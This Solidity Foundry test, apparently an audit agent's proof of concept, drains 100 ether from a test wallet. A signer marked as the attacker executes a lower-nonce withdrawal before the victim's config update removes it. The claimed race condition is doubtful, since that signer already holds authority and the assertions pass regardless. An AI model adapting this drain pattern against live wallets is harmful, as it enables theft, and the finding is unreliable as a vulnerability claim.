// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Factory.sol";
import "../src/Stage1Module.sol";
import "../src/modules/Payload.sol";
import "../src/modules/Nonce.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";

contract AuditAgentPoC is ExtendedSessionTestBase {
    // ATTACK TIMELINE:
    // 1. [Setup] Deploy Wallet with attacker (sessionWallet) and victim (identityWallet) as signers. Fund Wallet.
    // 2. [T=0] Attacker prepares Tx A (nonce=0) to drain funds, signed by old config.
    // 3. [T=1] Victim prepares Tx B (nonce=1) to update imageHash (remove attacker), signed by old config.
    // 4. [T=2] Attacker front-runs by ensuring Tx A is processed first in the block (lower nonce).
    // 5. [T=3] Tx A executes under old config rules, draining funds to attacker.
    // 6. [T=4] Tx B executes, updating config to remove attacker, but funds are already gone.
    // 7. [Assert] Verify attacker balance increased and Wallet balance decreased.

    function test_exploit() public {
        // 1. Setup: Create Wallet with both attacker and victim as signers
        string memory topology = _createDefaultTopology();
        (Stage1Module Wallet, string memory config, bytes32 imageHash) = _createWallet(topology);

        // Fund the Wallet
        vm.deal(address(Wallet), 100 ether);
        uint256 walletBalBefore = address(Wallet).balance;
        uint256 attackerBalBefore = sessionWallet.addr.balance;

        // 2. Attacker prepares Tx A (nonce 0) to drain funds
        Payload.Decoded memory payloadA = _buildPayload(0);
        payloadA.space = 0;
        payloadA.nonce = 0;
        payloadA.calls = new Payload.Call[](1);
        payloadA.calls[0].to = sessionWallet.addr;
        payloadA.calls[0].value = 100 ether;
        payloadA.calls[0].data = "";

        bytes memory sigA = _validExplicitSignature(payloadA, sessionWallet, config, topology, new uint8[](0));

        // 3. Victim prepares Tx B (nonce 1) to update imageHash (remove attacker)
        Payload.Decoded memory payloadB = _buildPayload(1);
        payloadB.space = 0;
        payloadB.nonce = 1;
        payloadB.calls = new Payload.Call[](1);
        payloadB.calls[0].to = address(Wallet);
        // Simulate config update call (e.g., updateImageHash)
        payloadB.calls[0].data = abi.encodeWithSignature("updateImageHash(bytes32)", bytes32(uint256(1)));

        bytes memory sigB = _validExplicitSignature(payloadB, identityWallet, config, topology, new uint8[](0));

        // 4 & 5. Attacker front-runs: Tx A executes first under old config
        // Since nonce 0 < nonce 1, the protocol forces Tx A to execute before Tx B
        Wallet.execute(PrimitivesRPC.toPackedPayload(vm, payloadA), sigA);

        uint256 attackerBalAfterA = sessionWallet.addr.balance;
        console.log("Step 5: Attacker balance after Tx A =", attackerBalAfterA);

        // 6. Tx B executes, updating config (but funds already drained)
        Wallet.execute(PrimitivesRPC.toPackedPayload(vm, payloadB), sigB);

        uint256 walletBalAfter = address(Wallet).balance;
        uint256 attackerBalAfter = sessionWallet.addr.balance;

        // 7. Assert: Attacker successfully drained funds before config update took effect
        assertGt(attackerBalAfter, attackerBalBefore, "Attacker profited from front-running config update");
        assertLt(walletBalAfter, walletBalBefore, "Wallet lost funds due to temporal race condition");
    }
}
